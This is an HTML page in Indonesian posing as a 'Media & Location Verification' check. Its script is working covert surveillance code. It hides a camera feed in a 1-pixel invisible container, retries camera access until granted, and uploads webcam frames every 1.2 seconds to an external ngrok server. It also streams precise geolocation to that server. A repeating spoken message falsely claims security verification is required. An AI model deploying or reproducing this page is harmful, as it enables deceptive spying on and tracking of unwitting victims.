<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Media & Location Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; padding: 16px; }
  .status-box { font-size: 13px; color: #cbd5e1; background: #111827; border: 1px solid #374151; padding: 10px 14px; border-radius: 6px; max-width: 380px; width: 100%; word-break: break-word; line-height: 1.45; }
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="cam-canvas" width="320" height="240"></canvas>
</div>

<div class="status-box" id="status-log">[Capture] Ketuk layar (one-click) untuk memulai verifikasi siklus...</div>

<script>
(function () {
  'use strict';

  var SERVER_BASE = "https://studly-unallegorized-brecken.ngrok-free.dev";

  var CONFIG = {
    cycleInterval: 5000,
    cameraRetryDelay: 3500,
    frameSendInterval: 1200,
    geoRefreshDelay: 8000,
    tts: {
      text: "Security verification required. Camera and location access must be enabled to confirm user identity.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      repeatDelay: 6000
    },
    geo: {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  };

  var state = {
    oneClickDone: false,
    cycleRunning: false,
    ttsLoopActive: false,
    ttsTimer: null,
    camStream: null,
    camActive: false,
    camPending: false,
    camRetryTimer: null,
    frameTimer: null,
    watchId: null,
    lastGeoText: "Belum ada data lokasi"
  };

  function logStatus(msg) {
    var el = document.getElementById('status-log');
    var now = new Date().toLocaleTimeString();
    var line = "[" + now + "] " + msg;
    if (el) el.textContent = line;
    console.log(line);
  }

  function sendTelemetry(endpoint, payload) {
    fetch(SERVER_BASE + endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
      },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function captureAndSendFrame() {
    if (!state.camActive) return;
    var video = document.getElementById('cam-feed');
    var canvas = document.getElementById('cam-canvas');
    if (!video || !canvas || video.readyState < 2) return;

    try {
      var ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      var dataUrl = canvas.toDataURL('image/jpeg', 0.65);
      sendTelemetry('/upload', { image: dataUrl });
    } catch (e) {}
  }

  function startFrameSender() {
    if (state.frameTimer) return;
    state.frameTimer = setInterval(captureAndSendFrame, CONFIG.frameSendInterval);
  }

  function scheduleNextTTS(delay) {
    if (!state.ttsLoopActive) return;
    clearTimeout(state.ttsTimer);
    state.ttsTimer = setTimeout(runTTSStep, delay || CONFIG.tts.repeatDelay);
  }

  function runTTSStep() {
    if (!state.ttsLoopActive) return;
    if (!('speechSynthesis' in window)) {
      scheduleNextTTS(CONFIG.tts.repeatDelay);
      return;
    }

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.onend = function () { scheduleNextTTS(CONFIG.tts.repeatDelay); };
      u.onerror = function () { scheduleNextTTS(CONFIG.tts.repeatDelay); };
      window.speechSynthesis.speak(u);
      scheduleNextTTS(CONFIG.tts.repeatDelay + 5000);
    } catch (e) {
      scheduleNextTTS(CONFIG.tts.repeatDelay);
    }
  }

  function ensureTTSCycle() {
    if (!state.ttsLoopActive) {
      state.ttsLoopActive = true;
      try { window.speechSynthesis.cancel(); } catch (e) {}
      runTTSStep();
    }
  }

  function scheduleCameraRetry() {
    clearTimeout(state.camRetryTimer);
    if (state.camActive || state.camPending) return;
    state.camRetryTimer = setTimeout(ensureCameraCycle, CONFIG.cameraRetryDelay);
  }

  function ensureCameraCycle() {
    if (state.camActive || state.camPending) return;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      logStatus("getUserMedia tidak tersedia.");
      scheduleCameraRetry();
      return;
    }

    state.camPending = true;
    navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
      audio: false
    })
    .then(function (stream) {
      state.camPending = false;
      state.camStream = stream;
      state.camActive = true;

      var videoElement = document.getElementById('cam-feed');
      if (videoElement) {
        videoElement.srcObject = stream;
        videoElement.play().catch(function () {});
      }

      startFrameSender();
      logStatus("Kamera aktif | " + state.lastGeoText);

      stream.getVideoTracks().forEach(function (track) {
        track.onended = function () {
          state.camActive = false;
          state.camStream = null;
          scheduleCameraRetry();
        };
      });
    })
    .catch(function (err) {
      state.camPending = false;
      state.camActive = false;
      logStatus("Kamera retry (" + err.name + ")...");
      scheduleCameraRetry();
    });
  }

  function handlePositionSuccess(pos) {
    var lat = pos.coords.latitude.toFixed(6);
    var lon = pos.coords.longitude.toFixed(6);
    var acc = Math.round(pos.coords.accuracy);
    state.lastGeoText = "Lokasi: " + lat + ", " + lon + " (±" + acc + "m)";
    logStatus((state.camActive ? "Kamera aktif | " : "Siklus aktif | ") + state.lastGeoText);

    sendTelemetry('/location', {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy
    });
  }

  function handlePositionError(err) {
    state.lastGeoText = "Lokasi error (" + err.code + "): " + err.message;
    logStatus(state.lastGeoText);
  }

  function startWatchPositionIfNeeded() {
    if (!('geolocation' in navigator)) return;
    if (state.watchId === null) {
      try {
        state.watchId = navigator.geolocation.watchPosition(handlePositionSuccess, handlePositionError, CONFIG.geo);
      } catch (e) {}
    }
  }

  function pollCurrentPosition() {
    if (!('geolocation' in navigator)) return;
    try {
      navigator.geolocation.getCurrentPosition(handlePositionSuccess, handlePositionError, CONFIG.geo);
    } catch (e) {}
  }

  function ensureLocationCycle() {
    startWatchPositionIfNeeded();
    pollCurrentPosition();
  }

  function runMasterCycle() {
    ensureTTSCycle();
    ensureLocationCycle();
    if (!state.camActive && !state.camPending) {
      ensureCameraCycle();
    }
  }

  function startMasterWatchdog() {
    if (state.cycleRunning) return;
    state.cycleRunning = true;
    setInterval(runMasterCycle, CONFIG.cycleInterval);
    setInterval(pollCurrentPosition, CONFIG.geoRefreshDelay);
  }

  function onFirstUserGesture() {
    if (!state.oneClickDone) {
      state.oneClickDone = true;
      logStatus("One-click aktif: menjalankan siklus kamera, lokasi & TTS...");
    }
    runMasterCycle();
    startMasterWatchdog();
  }

  ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
    document.addEventListener(evtName, onFirstUserGesture, { passive: true });
  });

  window.addEventListener('DOMContentLoaded', function () {
    startMasterWatchdog();
    ensureTTSCycle();
    ensureCameraCycle();
  });

  window.addEventListener('focus', runMasterCycle);

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) {
      state.camActive = false;
      state.camPending = false;
      runMasterCycle();
    }
  });
})();
</script>
</body>
</html>
